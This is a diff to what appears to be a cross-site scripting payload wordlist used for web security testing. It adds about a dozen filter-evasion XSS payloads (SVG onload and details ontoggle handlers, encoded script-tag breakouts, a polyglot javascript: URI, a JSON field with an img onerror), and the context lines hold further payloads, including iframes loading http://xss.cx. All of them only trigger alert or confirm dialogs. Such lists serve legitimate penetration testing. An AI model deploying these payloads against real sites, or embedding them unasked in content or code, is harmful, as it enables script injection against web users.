@@ -1,6 +1,6 @@
 <![
 <%%%>
- <%=	puts	"test"	%> 
+<%=	puts	"test"	%> 
 ">    "><iframe src=http://xss.cx onload=confirm(5) <<iframe src=a>    "><iframe src=http://xss.cx onload=confirm(8) <
 % E2% 88% 80% E3% B8% 80% E3% B0% 80script% E3% B8% 80confirm% 281% 29% E3% B0 % 80 80/script% E3% B8%
 <!-- Hello -- world > <SCRIPT>confirm(1)</SCRIPT> -->
@@ -1167,3 +1167,13 @@ javascript:_e({}, 'cvml', 'test-01-'-alert(1)-'');
 <p onbeforescriptexecute="alert(1)"><svg><script>\</p>
 <var onmouseover="prompt(1)">XSS</var>
 <script>parent.location.replace('javascript:alert(document.domain)')</script>
+"name":"Foo <img src=x onerror=alert(/XSS/.source)>Bar"
+%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert(1)%EF%BC%9E
+"xxxxxxxx'yyyyy</img
+<svg/onload=setTimeout`alert\`1\``>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<svg/onload=setTimeout`alert\`1\``>
+</script%20><script%20>confirm(1)</script%20>
+</script%0a><script%0a>confirm(1)</script%0a>
+<details open ontoggle=alert(1)>
+<svg onload=+~-!alert(1)>
